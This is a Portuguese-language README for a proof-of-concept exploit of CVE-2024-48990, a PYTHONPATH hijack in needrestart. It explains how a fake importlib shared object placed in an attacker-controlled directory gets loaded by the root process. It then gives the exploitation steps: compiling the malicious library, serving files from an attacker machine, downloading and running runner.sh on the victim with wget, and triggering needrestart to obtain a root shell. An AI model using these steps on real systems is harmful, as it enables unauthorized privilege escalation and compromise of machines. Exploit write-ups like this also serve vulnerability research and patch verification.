# POC: CVE-2024-48990
(identificada na referência como CVE-2024-48990) é um PYTHONPATH Sequestro vulnerabilidade.

## Em teoria:

1. O que needrestart Faz: Esta ferramenta (que é executada como root através de sudo) verifica todos os processos em execução para ver se eles estão usando bibliotecas desatualizadas que exigem reinicialização.
2. Inspecionando Python: Quando encontra um Python processo, ele tenta inspecionar de forma inteligente o ambiente desse processo. Para fazer isso, o needrestart o próprio processo tentará import bibliotecas Python padrão, como importlib.
3. O PYTHONPATH Variável de ambiente: Esta variável informa Python onde para procurar módulos antes ele procura nos locais padrão do sistema.
##### 4. O sequestro:
   * Um invasor (nós) executa um script Python simples (e.py) como o usuário.
   * Crucialmente, executamos este script com um personalizado, malicioso PYTHONPATH. Nós definimos PYTHONPATH para um diretório que controlamos, por exemplo, /tmp/malicious.
   * Dentro /tmp/malicious, criamos uma farsa importlib módulo (/tmp/malicious/importlib/__init__.so).
   * Então corremos sudo /usr/sbin/needrestart em outro terminal.
   * O needrestart processo (executando como root) encontrará nosso e.py roteiro. Ele lerá seu ambiente, verá o personalizado PYTHONPATH, e herde-o.
   * Quando o root processo tenta import importlib, ele vai olhar em nosso malicioso PYTHONPATH primeiro.
   * Ele encontrará e carregará /tmp/malicious/importlib/__init__.so como usuário root.
   * Agora conseguimos a execução do código como root.

## Em ação:
copile a lib com:

        gcc -shared -fPIC -o __init__.so lib.c

        Invasor Machine:
        python3 -m http.server 8000

na maquina da vitma:

        Vitim:
        wget http://<ip>:8000/runner.sh
        chmod +x runner.sh
        ./runner.sh

nesse momento voce deve se abrir um segundo terminal na maquina alvo:
        
        sudo /usr/sbin/needrestart

Agora é so voltar ao primeiro terminal da vitma:

        root.# id uid=0(root) gid=0(root) groups=0(root) 
        # whoami root
